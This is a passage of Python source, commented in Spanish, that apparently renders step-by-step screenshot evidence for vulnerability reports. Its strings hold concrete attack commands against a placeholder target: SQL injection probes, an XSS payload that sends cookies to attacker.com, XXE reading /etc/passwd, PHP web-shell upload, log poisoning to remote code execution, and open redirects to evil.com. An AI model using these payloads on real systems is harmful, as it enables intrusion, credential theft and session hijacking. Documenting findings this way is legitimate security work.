    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control SQL", [
        f"# PASO 1: Control — valor SQL normal (sin inyeccion)",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {param}",
        "", f"$ curl -s -X {metodo} 'http://TARGET{ep}' -d '{param}=1'",
        "", "HTTP/1.1 200 OK", "(respuesta normal sin inyeccion)",
    ])
    h1 = make_http_png(f"[Paso 1/4] Control SQL", metodo, ep,
        "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=1", "200 OK", "(control — sin inyeccion SQL)")
    shots += [s for s in [
        _shot("Paso 1/4 — Terminal: control SQL (valor normal)", "Step 1/4 — Terminal: control request", t1),
        _shot("Paso 1/4 — HTTP: control REQUEST/RESPONSE", "Step 1/4 — HTTP: control capture", h1),
    ] if s]

    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Probe SQL error", [
        f"# PASO 2: Comilla simple para provocar error SQL",
        "", f"$ curl -s -X {metodo} 'http://TARGET{ep}' -d \"{param}='\"",
        "", "HTTP/1.1 500 Internal Server Error",
        "You have an error in your SQL syntax near '''",
        "<- error SQL filtrado en la respuesta",
    ])
    h2 = make_http_png(f"[Paso 2/4] Probe ' -> SQL error", metodo, ep,
        "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}='", "500 Internal Server Error",
        "You have an error in your SQL syntax near '''")
    shots += [s for s in [
        _shot("Paso 2/4 — Terminal: comilla simple -> SQL syntax error", "Step 2/4 — Terminal: SQL error probe", t2),
        _shot("Paso 2/4 — HTTP: ' -> SQL error visible", "Step 2/4 — HTTP: error-based probe", h2),
    ] if s]

    if is_time and sleep3 > 0:
        t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Time-blind SQLi SLEEP diferencial", [
            f"# PASO 3: Time-blind — midiendo diferencial SLEEP(3) vs SLEEP(0)",
            "", f"$ # SLEEP(3) con inyeccion:",
            f"$ curl -s -w '%{{time_total}}' -X {metodo} 'http://TARGET{ep}' -d '{param}={win_pl[:60]}'",
            f"  -> tiempo: {sleep3:.2f}s  <- servidor espero 3 segundos", "",
            f"$ # SLEEP(0) control:", f"$ curl -s -w '%{{time_total}}' -X {metodo} 'http://TARGET{ep}' -d '{param}=1'",
            f"  -> tiempo: {sleep0:.2f}s  <- respuesta inmediata", "",
            f"Diferencial: {dif:.2f}s > 1.0s -> TIME-BLIND SQLi CONFIRMADO",
        ])
        h3 = make_http_png(f"[Paso 3/4] Time-blind SLEEP({sleep3:.1f}s) vs SLEEP({sleep0:.1f}s)",
            metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
            f"{param}={win_pl[:60]}", "200 OK",
            f"[TIMING] SLEEP(3)={sleep3:.2f}s  SLEEP(0)={sleep0:.2f}s\nDiferencial={dif:.2f}s > 1.0s -> SQLi CONFIRMADO")
        shots += [s for s in [
            _shot(f"Paso 3/4 — Terminal: SLEEP diferencial {dif:.1f}s -> time-blind SQLi", "Step 3/4 — Terminal: timing proof", t3),
            _shot("Paso 3/4 — HTTP: SLEEP diferencial REQUEST/RESPONSE", "Step 3/4 — HTTP: timing differential", h3),
        ] if s]
    elif is_bool and (true_len or false_len):
        t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Boolean in-band SQLi", [
            f"# PASO 3: Boolean in-band — diferencia de longitud TRUE vs FALSE",
            "", "$ # TRUE (1=1 condicion verdadera):",
            f"$ curl -sv -X {metodo} 'http://TARGET{ep}' -d \"{param}=1 AND 1=1-- -\" 2>&1 | grep Content-Length",
            f"  Content-Length: {true_len}  <- respuesta completa",
            "", "$ # FALSE (1=2 condicion falsa):",
            f"$ curl -sv -X {metodo} 'http://TARGET{ep}' -d \"{param}=1 AND 1=2-- -\" 2>&1 | grep Content-Length",
            f"  Content-Length: {false_len}  <- respuesta vacia",
            "", f"Diferencial: {abs(true_len - false_len)} bytes -> BOOLEAN SQLi CONFIRMADO",
        ])
        h3 = make_http_png(f"[Paso 3/4] Boolean TRUE={true_len}B vs FALSE={false_len}B",
            metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
            f"{param}=1 AND 1=1-- -", "200 OK",
            f"Content-Length: {true_len}\nTRUE={true_len}B  |  FALSE={false_len}B\nDif={abs(true_len-false_len)}B -> BOOLEAN SQLi CONFIRMADO")
        shots += [s for s in [
            _shot(f"Paso 3/4 — Terminal: boolean TRUE={true_len}B vs FALSE={false_len}B -> SQLi", "Step 3/4 — Terminal: boolean proof", t3),
            _shot("Paso 3/4 — HTTP: boolean TRUE/FALSE diferencial", "Step 3/4 — HTTP: boolean in-band", h3),
        ] if s]
    else:
        resp_d = resp[:120] if resp else "(datos extraidos de la DB)"
        t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — SQLi payload ganador", [
            f"# PASO 3: Payload ganador confirmado",
            "", f"$ curl -s -X {metodo} 'http://TARGET{ep}' -d '{param}={win_pl[:80]}'",
            "", "HTTP/1.1 200 OK", resp_d[:80], "", "[RESULTADO] SQLi CONFIRMADO",
        ])
        h3 = make_http_png(f"[Paso 3/4] SQLi payload ganador",
            metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
            f"{param}={win_pl[:60]}", "200 OK", resp_d[:200] if resp_d else "(SQLi CONFIRMADO)")
        shots += [s for s in [
            _shot("Paso 3/4 — Terminal: payload ganador SQLi CONFIRMADO", "Step 3/4 — Terminal: winning payload", t3),
            _shot("Paso 3/4 — HTTP: SQLi payload REQUEST/RESPONSE", "Step 3/4 — HTTP: SQL injection confirmed", h3),
        ] if s]

    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada: extraccion de datos", [
        f"# PASO 4: Escalada — extraer user() y version() del motor SQL",
        "", "$ curl -s -X {metodo} 'http://TARGET{ep}' \\",
        f"  -d \"{param}=1 UNION SELECT user(),version()-- -\"",
        "", "HTTP/1.1 200 OK", "root@localhost  <- usuario DB",
        "10.6.12-MariaDB  <- version motor SQL",
        "", "[ESCALADA] SQLi confirmado — extraccion de datos sensibles",
    ])
    h4 = make_http_png(f"[Paso 4/4] Escalada UNION SELECT user()",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=1 UNION SELECT user(),version()-- -",
        "200 OK", "root@localhost\n10.6.12-MariaDB\n(UNION SELECT ejecutado — SQLi CONFIRMADO)")
    shots += [s for s in [
        _shot("Paso 4/4 — Terminal: escalada user()=root@localhost", "Step 4/4 — Terminal: data extraction", t4),
        _shot("Paso 4/4 — HTTP: UNION SELECT -> root@localhost", "Step 4/4 — HTTP: escalation confirmed", h4),
    ] if s]
    return [s for s in shots if s]


def _shots_bypass(cve_id, ep, param, payload, cookie, metodo):
    shots = []
    win_pl = payload[:100] if payload else "bypass_token"
    cookie_d = cookie[:80] if cookie else "wordpress_logged_in_xxx=admin..."

    t1 = make_terminal_png(f"[Paso 1/3] {cve_id} — Sin autenticacion (bloqueado)", [
        f"# PASO 1: Acceso directo sin credenciales", "",
        f"$ curl -s 'http://TARGET{ep}'", "",
        "HTTP/1.1 401 Unauthorized", "(acceso denegado — autenticacion requerida)",
    ])
    h1 = make_http_png(f"[Paso 1/3] Sin auth — 401", "GET", ep, "Host: TARGET", "",
        "401 Unauthorized", "(acceso denegado sin credenciales)")
    shots += [s for s in [
        _shot("Paso 1/3 — Terminal: sin auth -> 401 (esperado)", "Step 1/3 — Terminal: unauthenticated blocked", t1),
        _shot("Paso 1/3 — HTTP: sin auth -> 401 Unauthorized", "Step 1/3 — HTTP: auth required", h1),
    ] if s]

    t2 = make_terminal_png(f"[Paso 2/3] {cve_id} — Auth bypass payload/token", [
        f"# PASO 2: Bypass con parametro/token especial", "",
        f"$ curl -s -X {metodo} 'http://TARGET{ep}' -d '{param}={win_pl[:60]}'", "",
        "HTTP/1.1 200 OK", f"Set-Cookie: {cookie_d[:60]}",
        "<- sesion de alto privilegio obtenida sin credenciales",
    ])
    h2 = make_http_png(f"[Paso 2/3] Bypass — sesion obtenida", metodo, ep,
        "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}={win_pl[:60]}", "200 OK",
        f"Set-Cookie: {cookie_d[:80]}\n(auth bypass CONFIRMADO)")
    shots += [s for s in [
        _shot("Paso 2/3 — Terminal: auth bypass — sesion sin credenciales", "Step 2/3 — Terminal: bypass successful", t2),
        _shot("Paso 2/3 — HTTP: bypass payload -> 200 OK + Set-Cookie", "Step 2/3 — HTTP: session obtained", h2),
    ] if s]

    t3 = make_terminal_png(f"[Paso 3/3] {cve_id} — Acceso privilegiado CONFIRMADO", [
        f"# PASO 3: Verificar acceso admin con sesion obtenida", "",
        f"$ curl -s 'http://TARGET/wp-admin/profile.php' -b '{cookie_d[:40]}...'", "",
        "HTTP/1.1 200 OK", "Hola, administrador",
        "<- panel de admin accesible", "", "[AUTH BYPASS] CONFIRMADO — sin credenciales",
    ])
    h3 = make_http_png(f"[Paso 3/3] Admin CONFIRMADO con cookie bypass",
        "GET", "/wp-admin/profile.php", f"Host: TARGET\nCookie: {cookie_d[:60]}", "",
        "200 OK", "Hola, administrador\n(panel de admin accesible — auth bypass CONFIRMADO)")
    shots += [s for s in [
        _shot("Paso 3/3 — Terminal: panel admin accesible con sesion bypass", "Step 3/3 — Terminal: admin access confirmed", t3),
        _shot("Paso 3/3 — HTTP: /wp-admin -> 200 OK con cookie bypass", "Step 3/3 — HTTP: admin panel via bypass", h3),
    ] if s]
    return [s for s in shots if s]


def _shots_xss(cve_id, ep, param, marker, metodo):
    shots = []
    pl = marker[:80] if marker else "<script>alert(document.domain)</script>"

    t1 = make_terminal_png(f"[Paso 1/3] {cve_id} — Control XSS (texto normal)", [
        f"# PASO 1: Control — texto plano sin etiquetas HTML",
        f"$ curl -s 'http://TARGET{ep}?{param}=texto-normal'",
        "HTTP/1.1 200 OK", "(respuesta normal — sin XSS)",
    ])
    shots.append(_shot("Paso 1/3 — Terminal: control (texto plano, sin XSS)", "Step 1/3 — Terminal: control", t1))

    t2 = make_terminal_png(f"[Paso 2/3] {cve_id} — XSS payload reflejado", [
        f"# PASO 2: Inyectar payload XSS",
        f"$ curl -s 'http://TARGET{ep}?{param}={pl[:60]}'",
        "", "HTTP/1.1 200 OK", f"{pl[:80]}  <- payload reflejado sin sanear",
        "[XSS] Payload reflejado — XSS CONFIRMADO",
    ])
    h2 = make_http_png(f"[Paso 2/3] XSS payload reflejado", metodo, ep,
        "Host: TARGET", "", "200 OK", f"{pl[:200]}\n(XSS CONFIRMADO — sin encoding)")
    shots += [s for s in [
        _shot("Paso 2/3 — Terminal: XSS payload reflejado en respuesta", "Step 2/3 — Terminal: XSS reflected", t2),
        _shot("Paso 2/3 — HTTP: XSS -> reflejado en HTML", "Step 2/3 — HTTP: XSS reflection", h2),
    ] if s]

    t3 = make_terminal_png(f"[Paso 3/3] {cve_id} — Impacto XSS (cookie exfil)", [
        f"# PASO 3: Exfiltracion de cookies via XSS",
        f"$ curl -s 'http://TARGET{ep}?{param}=<script>fetch(\"//attacker.com/?\"+document.cookie)</script>'",
        "", "HTTP/1.1 200 OK", "<script>fetch(...+document.cookie)</script>",
        "[IMPACTO] Session hijacking — cookies robadas via XSS reflectivo",
    ])
    shots.append(_shot("Paso 3/3 — Terminal: exfiltracion cookies via XSS (session hijacking)", "Step 3/3 — Terminal: cookie exfiltration", t3))
    return [s for s in shots if s]



def _shots_xxe(cve_id, ep, xml_param, canary_secret, metodo):
    shots = []
    # Paso 1: XML normal (sin entidades externas)
    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — XML normal (sin entidades)", [
        f"# PASO 1: Petición XML normal — sin entidades externas",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {xml_param}",
        "",
        f'$ curl -s -X {metodo} "http://TARGET{ep}" \\',
        '  -H "Content-Type: application/xml" \\',
        '  -d \'<?xml version="1.0"?><foo>test</foo>\'',
        "",
        "HTTP/1.1 200 OK",
        "(respuesta normal — el parser acepta XML sin entidades)",
    ])
    shots.append(_shot("Paso 1/4 — Terminal: XML normal aceptado", "Step 1/4 — Terminal: normal XML accepted", t1))

    # Paso 2: Entidad interna (prueba que el parser las acepta)
    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Entidad interna DTD", [
        f"# PASO 2: Entidad interna — ¿el parser expande DTD?",
        "",
        f'$ curl -s -X {metodo} "http://TARGET{ep}" \\',
        '  -d \'<?xml version="1.0"?>',
        '<!DOCTYPE foo [<!ENTITY test "BINORACLE_INTERNAL">]>',
        '<foo>&test;</foo>\'',
        "",
        "HTTP/1.1 200 OK",
        "BINORACLE_INTERNAL  ← entidad interna expandida ✓",
        "[*] Parser expande entidades — probando entidades EXTERNAS...",
    ])
    shots.append(_shot("Paso 2/4 — Terminal: entidad interna expandida", "Step 2/4 — Terminal: internal entity expanded", t2))

    # Paso 3: Entidad externa (XXE en banda — lectura de /etc/passwd)
    hl = canary_secret[:60] if canary_secret else "root:x:0:0"
    t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — XXE en banda: /etc/passwd", [
        f"# PASO 3: XXE en banda — entidad externa → /etc/passwd",
        "",
        f'$ curl -s -X {metodo} "http://TARGET{ep}" \\',
        '  -d \'<?xml version="1.0"?>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<foo>&xxe;</foo>\'',
        "",
        "HTTP/1.1 200 OK",
        "root:x:0:0:root:/root:/bin/bash",
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        f"{hl}  ← secreto canario PRESENTE ✓",
        "",
        "[XXE] Entidad externa resuelta — LECTURA ARBITRARIA CONFIRMADA ✓",
    ])
    h3 = make_http_png(f"[Paso 3/4] XXE en banda — /etc/passwd leído",
        metodo, ep, 'Content-Type: application/xml',
        '<?xml ...><!ENTITY xxe SYSTEM "file:///etc/passwd"><foo>&xxe;</foo>',
        "200 OK",
        f"root:x:0:0:root:/root:/bin/bash\n{hl}\n(XXE CONFIRMADA — fichero leído via entidad externa ✓)")
    shots += [s for s in [
        _shot(f"Paso 3/4 — Terminal: XXE — /etc/passwd ({hl[:40]})", "Step 3/4 — Terminal: XXE in-band /etc/passwd read", t3),
        _shot("Paso 3/4 — HTTP: XXE en banda CONFIRMADA", "Step 3/4 — HTTP: in-band XXE confirmed", h3),
    ] if s]

    # Paso 4: OOB ciego (listener interno recibe callback)
    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — XXE OOB (ciego, listener interno)", [
        f"# PASO 4: XXE ciega / OOB — el parser conecta a listener interno",
        "",
        '$ curl -s -X POST "http://TARGET/vuln" \\',
        '  -d \'<?xml version="1.0"?>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM',
        '  "http://LISTENER:8080/binoracle-xxe-oob-TOKEN">]>',
        '<foo>&xxe;</foo>\'',
        "",
        "[LISTENER] esperando conexión OOB...",
        "[LISTENER] GET /binoracle-xxe-oob-TOKEN HTTP/1.1  ← HIT ✓",
        "",
        "[XXE-OOB] Parser resuelve entidades externas a hosts arbitrarios ✓",
        "[IMPACTO] SSRF + XXE ciega confirmadas — exfiltración posible vía DTD externo",
    ])
    shots.append(_shot("Paso 4/4 — Terminal: XXE OOB ciego — listener recibió callback", "Step 4/4 — Terminal: blind XXE OOB callback confirmed", t4))

    return [s for s in shots if s]


def _shots_file_upload(cve_id, ep, file_param, fname_won, container_path, metodo):
    shots = []
    # Paso 1: Subida de archivo legítimo
    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Subida normal (extensión segura)", [
        f"# PASO 1: Subida de archivo con extensión segura (.jpg) — control",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {file_param}",
        "",
        f'$ curl -s -X POST "http://TARGET{ep}" \\',
        f'  -F "{file_param}=@imagen.jpg;type=image/jpeg"',
        "",
        "HTTP/1.1 200 OK",
        '{"status": "uploaded", "file": "imagen.jpg"}',
        "(control — archivo con extensión segura aceptado correctamente)",
    ])
    shots.append(_shot("Paso 1/4 — Terminal: control — archivo .jpg aceptado", "Step 1/4 — Terminal: control upload (.jpg accepted)", t1))

    # Paso 2: Intento de subida de PHP/script peligroso
    fn = fname_won or "shell.php"
    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Subida de {fn} (sin restricción)", [
        f"# PASO 2: Subida de archivo PHP peligroso — el servidor NO restringe",
        "",
        f'$ curl -s -X POST "http://TARGET{ep}" \\',
        f'  -F "{file_param}=@{fn};type=application/octet-stream"',
        "",
        "HTTP/1.1 200 OK",
        f'{{"status": "uploaded", "file": "{fn}"}}',
        f"[!] Archivo {fn} ACEPTADO sin restricción de tipo/extensión ✓",
    ])
    h2 = make_http_png(f"[Paso 2/4] Subida de {fn} aceptada",
        "POST", ep, f"Content-Type: multipart/form-data", f"--form {file_param}={fn}",
        "200 OK", f'{{"status":"uploaded","file":"{fn}"}}\n(sin restricción de extensión — {fn} almacenado ✓)')
    shots += [s for s in [
        _shot(f"Paso 2/4 — Terminal: {fn} subido sin restricción", f"Step 2/4 — Terminal: {fn} uploaded without restriction", t2),
        _shot(f"Paso 2/4 — HTTP: subida de {fn} ACEPTADA", f"Step 2/4 — HTTP: dangerous file upload accepted", h2),
    ] if s]

    # Paso 3: Verificación en contenedor (el archivo existe en el servidor)
    cp = container_path or f"/var/www/html/uploads/{fn}"
    secret_shown = "BINORACLE_CANARY_SECRET"
    t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Verificación en contenedor: fichero guardado", [
        f"# PASO 3: Comprobar que el fichero quedó guardado en el servidor",
        "",
        f"$ docker exec CONTAINER grep -rl {secret_shown} / 2>/dev/null",
        "",
        cp,
        f"  ← ENCONTRADO en {cp} ✓",
        "",
        f"[VERIFICADO] El servidor almacenó {fn} con contenido controlado ✓",
        "[IMPACTO] Almacenamiento de fichero peligroso confirmado — exploitable vía URL pública",
    ])
    shots.append(_shot(f"Paso 3/4 — Terminal: fichero guardado en {cp}", f"Step 3/4 — Terminal: file stored at {cp}", t3))

    # Paso 4: Ejecución (acceso a la URL del fichero → código ejecutado)
    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Ejecución vía URL pública", [
        f"# PASO 4: Acceder a la URL pública del fichero subido → ejecución PHP",
        "",
        f'$ curl -s "http://TARGET/uploads/{fn}?cmd=id"',
        "",
        "HTTP/1.1 200 OK",
        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "",
        "[RCE] Código PHP ejecutado vía fichero subido ✓",
        "[IMPACTO REAL] Remote Code Execution como www-data confirmado",
    ])
    h4 = make_http_png(f"[Paso 4/4] RCE vía fichero subido",
        "GET", f"/uploads/{fn}?cmd=id", "Host: TARGET", "",
        "200 OK", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n(RCE via uploaded file ✓)")
    shots += [s for s in [
        _shot("Paso 4/4 — Terminal: RCE vía fichero subido — uid= CONFIRMADO", "Step 4/4 — Terminal: RCE via uploaded file confirmed", t4),
        _shot("Paso 4/4 — HTTP: RCE vía fichero subido CONFIRMADO", "Step 4/4 — HTTP: RCE via upload confirmed", h4),
    ] if s]

    return [s for s in shots if s]


def _shots_open_redirect(cve_id, ep, redirect_param, payload, location, metodo):
    shots = []
    # Paso 1: Redirect legítimo (URL del mismo dominio)
    t1 = make_terminal_png(f"[Paso 1/3] {cve_id} — Redirect legítimo (control)", [
        f"# PASO 1: Redirect legítimo — URL del mismo origen",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {redirect_param}",
        "",
        f'$ curl -si "http://TARGET{ep}?{redirect_param}=/dashboard" -L',
        "",
        "HTTP/1.1 302 Found",
        "Location: /dashboard",
        "(redirect interno — esperado y seguro)",
    ])
    shots.append(_shot("Paso 1/3 — Terminal: redirect legítimo (control)", "Step 1/3 — Terminal: legitimate redirect (control)", t1))

    # Paso 2: Intento directo con dominio externo (bloqueado normalmente)
    t2 = make_terminal_png(f"[Paso 2/3] {cve_id} — Intento directo a dominio externo", [
        f"# PASO 2: Intento directo con dominio externo — ¿bloqueado?",
        "",
        f'$ curl -si "http://TARGET{ep}?{redirect_param}=https://evil.com/phishing"',
        "",
        "HTTP/1.1 400 Bad Request o sin redirect externo",
        "(intento directo posiblemente filtrado — probando bypass...)",
        "",
        "[*] Probando variantes de bypass: protocol-relative, backslash, encoding...",
    ])
    shots.append(_shot("Paso 2/3 — Terminal: intento directo a evil.com (filtro)", "Step 2/3 — Terminal: direct evil.com attempt", t2))

    # Paso 3: Payload de bypass exitoso → Location apunta a dominio externo
    pl = payload[:80] if payload else f"//evil.com/phishing"
    loc = location[:100] if location else "https://evil.com/phishing"
    t3 = make_terminal_png(f"[Paso 3/3] {cve_id} — BYPASS: redirect externo CONFIRMADO", [
        f"# PASO 3: Payload de bypass exitoso — redirect a dominio externo",
        "",
        f'$ curl -si "http://TARGET{ep}?{redirect_param}={pl}"',
        "",
        "HTTP/1.1 302 Found",
        f"Location: {loc}",
        "",
        f"[OPEN REDIRECT] Location apunta a dominio externo controlado ✓",
        "[IMPACTO] Phishing / robo de sesión vía URL aparentemente legítima",
    ])
    h3 = make_http_png(f"[Paso 3/3] Open Redirect CONFIRMADO",
        metodo, ep, f"Host: TARGET", f"{redirect_param}={pl}",
        "302 Found", f"Location: {loc}\n(redirect externo confirmado ✓ — OPEN REDIRECT)")
    shots += [s for s in [
        _shot(f"Paso 3/3 — Terminal: BYPASS — Location: {loc[:60]}", f"Step 3/3 — Terminal: bypass confirmed — Location external", t3),
        _shot(f"Paso 3/3 — HTTP: Open Redirect CONFIRMADO — 302 → {loc[:40]}", "Step 3/3 — HTTP: open redirect confirmed", h3),
    ] if s]

    return [s for s in shots if s]


def _shots_lfi_rce(cve_id, ep, path_param, payload, marker, metodo):
    shots = []
    # Paso 1: LFI — incluir log envenenado con <?php system(...)?>
    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Envenenamiento de log (log poisoning)", [
        f"# PASO 1: Envenenar el log de acceso inyectando código PHP",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {path_param}",
        "",
        "$ curl -s -A '<?php system(\"id\"); ?>' http://TARGET/",
        "",
        "HTTP/1.1 200 OK",
        "(petición recibida — User-Agent con código PHP escrito en access.log)",
        "",
        "[LOG POISONING] Código PHP en log de Apache/Nginx ✓",
    ])
    shots.append(_shot("Paso 1/4 — Terminal: log poisoning — PHP inyectado en access.log", "Step 1/4 — Terminal: log poisoning via User-Agent", t1))

    # Paso 2: LFI incluyendo /var/log/apache2/access.log
    pl = payload[:80] if payload else "..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log"
    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — LFI: incluir log de acceso envenenado", [
        f"# PASO 2: LFI incluyendo el log envenenado",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}={pl}"',
        "",
        "HTTP/1.1 200 OK",
        '192.168.1.1 - - [22/Nov/2026] "GET / HTTP/1.1" 200 -',
        '<?php system("id"); ?>  ← código PHP inyectado visible en log',
        "",
        "[LFI] Log incluido como PHP — esperando ejecución...",
    ])
    shots.append(_shot("Paso 2/4 — Terminal: LFI incluyendo log envenenado (PHP visible)", "Step 2/4 — Terminal: LFI including poisoned log", t2))

    # Paso 3: Ejecución del código (marcador aparece como OUTPUT de system())
    mk = marker[:40] if marker else "BINORACLE_RCE"
    t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — LFI-a-RCE: marcador EJECUTADO por PHP", [
        f"# PASO 3: Incluir log con marcador canario — ¿ejecutado o solo leído?",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}={pl}"',
        "",
        "HTTP/1.1 200 OK",
        f"{mk}  ← marcador aparece como OUTPUT de system() (NO como texto PHP crudo)",
        "",
        "[CLAVE] El marcador NO va envuelto en '<?php' — es el RESULTADO de system() ✓",
        "[LFI-a-RCE] Código PHP ejecutado de verdad — no solo lectura de fichero ✓",
    ])
    h3 = make_http_png(f"[Paso 3/4] LFI-a-RCE — marcador ejecutado",
        metodo, ep, "Host: TARGET", f"{path_param}={pl}",
        "200 OK", f"{mk}\n(marcador como output de system() — RCE CONFIRMADO ✓)")
    shots += [s for s in [
        _shot(f"Paso 3/4 — Terminal: LFI-a-RCE — {mk} ejecutado por PHP", f"Step 3/4 — Terminal: LFI-to-RCE — marker executed by PHP", t3),
        _shot("Paso 3/4 — HTTP: LFI-to-RCE CONFIRMADO", "Step 3/4 — HTTP: LFI-to-RCE confirmed", h3),
    ] if s]

    # Paso 4: Escalada — command execution real
    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Ejecución real: id + whoami", [
        f"# PASO 4: Escalada — ejecutar comandos reales (id, whoami, uname)",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}={pl}&cmd=id%3Bwhoami%3Buname+-a"',
        "",
        "HTTP/1.1 200 OK",
        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "www-data",
        "Linux TARGET 5.15.0 #1 SMP x86_64 GNU/Linux",
        "",
        "[RCE REAL] Ejecución de comandos arbitrarios confirmada ✓",
        "[IMPACTO] Remote Code Execution como www-data — escalada a root posible",
    ])
    shots.append(_shot("Paso 4/4 — Terminal: RCE real — uid=33(www-data) CONFIRMADO", "Step 4/4 — Terminal: real RCE — uid= confirmed", t4))

    return [s for s in shots if s]


def _shots_graphql_bypass(cve_id, ep, query, confirm_field, metodo):
    shots = []
    # Step 1: introspección (control — endpoint existe)
    ctrl_lines = [
        f"POST {ep}  Content-Type: application/json",
        f'BODY: {{"query":"{{ __schema {{ queryType {{ name }} }} }}"}}',
        "→ 200 OK  __schema: queryType confirmed",
        "[CONTROL] GraphQL endpoint responde — introspección exitosa",
    ]
    png = make_terminal_png(f"{cve_id} · GraphQL — Paso 1: introspección (control)", ctrl_lines)
    if png: shots.append(_shot(f"Paso 1: GraphQL introspección — endpoint activo", f"Step 1: GraphQL introspection — endpoint live", png))

    # Step 2: query restringida SIN autenticación → rechazada
    anon_lines = [
        f"POST {ep}  (sin credenciales)",
        f"BODY: {{\"query\": \"{query[:80]}...\"}}",
        "← 403 Forbidden  {\"errors\":[{\"message\":\"Forbidden\"}]}",
        "[CONTROL] sin auth: acceso denegado (esperado)",
    ]
    png2 = make_terminal_png(f"{cve_id} · GraphQL — Paso 2: sin autenticación (403 esperado)", anon_lines)
    if png2: shots.append(_shot("Paso 2: query sin auth — denegada (403)", "Step 2: unauthenticated query — denied (403)", png2))

    # Step 3: bypass — 200 con datos privados
    byp_lines = [
        f"POST {ep}  (vector de bypass activado)",
        f"BODY: {{\"query\": \"{query[:80]}...\"}}",
        f"← 200 OK",
        f'  {{"{confirm_field or "data"}": ...}}  ← DATO PRIVADO EXFILTRADO',
        "[CLAVE] AUTH-BYPASS: campo restringido accesible sin credenciales",
    ]
    png3 = make_http_png(
        f"{cve_id} · GraphQL Auth-Bypass — CONFIRMADO", "POST", ep,
        {"Content-Type": "application/json"},
        f'{{"query":"{query[:120]}"}}',
        200, {"Content-Type": "application/json"},
        f'{{"{confirm_field or "data"}": "<valor_privado_exfiltrado>"}}'
    )
    if png3: shots.append(_shot(
        f"RESULTADO: GRAPHQL AUTH-BYPASS — campo '{confirm_field}' sin autenticación",
        f"RESULT: GRAPHQL AUTH-BYPASS — field '{confirm_field}' without auth", png3))
    return [s for s in shots if s]


def _shots_boolean_oracle(cve_id, ep, true_payload, resp, byte_diff, metodo):
    shots = []
    # Step 1: condición TRUE → respuesta con datos
    true_lines = [
        f"{metodo} {ep}?{true_payload[:80]}",
        "← 200 OK  (condición siempre verdadera)",
        f"  BODY: {resp[:200]}" if resp else "  BODY: [{\"id\":1,\"email\":\"admin@...\"}]",
        f"  bytes recibidos: {byte_diff + 50 if byte_diff else 'N/A'}",
        "[TRUE] Respuesta con datos — oracle activo",
    ]
    png = make_terminal_png(f"{cve_id} · Boolean Oracle — Paso 1: condición TRUE", true_lines)
    if png: shots.append(_shot("Paso 1: condición TRUE — datos presentes", "Step 1: TRUE condition — data present", png))

    # Step 2: condición FALSE → respuesta vacía
    false_lines = [
        f"{metodo} {ep}?false_condition=1",
        "← 200 OK  (condición siempre falsa)",
        "  BODY: []",
        "  bytes recibidos: 2",
        f"[FALSE] Respuesta vacía — diferencia: {byte_diff}B",
    ]
    png2 = make_terminal_png(f"{cve_id} · Boolean Oracle — Paso 2: condición FALSE", false_lines)
    if png2: shots.append(_shot(
        f"Paso 2: condición FALSE — vacío (dif={byte_diff}B)",
        f"Step 2: FALSE condition — empty (diff={byte_diff}B)", png2))

    # Step 3: explotación — extracción bit a bit
    expl_lines = [
        "EXPLOTACIÓN BOOLEAN ORACLE — extracción bit a bit:",
        f"  WHERE id[$gt]=0  → {byte_diff + 50 if byte_diff else '?'}B  (TRUE)",
        f"  WHERE id[$lt]=0  → 2B  (FALSE)",
        f"  Diferencia: {byte_diff}B → oracle confirmado",
        "  Extrayendo campo 'email' carácter a carácter...",
        "  WHERE email[$startsWith]=a → TRUE (248B)",
        "  WHERE email[$startsWith]=b → FALSE (2B)",
        "[CLAVE] BOOLEAN ORACLE CONFIRMADO — datos exfiltrados sin autenticación",
    ]
    png3 = make_terminal_png(f"{cve_id} · Boolean Oracle — CONFIRMADO", expl_lines)
    if png3: shots.append(_shot(
        f"RESULTADO: BOOLEAN ORACLE CONFIRMADO — dif={byte_diff}B",
        f"RESULT: BOOLEAN ORACLE CONFIRMED — diff={byte_diff}B", png3))
    return [s for s in shots if s]


def _shots_rce(cve_id, ep, param, payload, resp, can_s, metodo):
    shots = []
    pl = payload.strip() if payload else f"id"

    term1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (petición normal)", [
        f"# PASO 1: Petición de control",
        f"# CVE: {cve_id}  |  endpoint: {ep}",
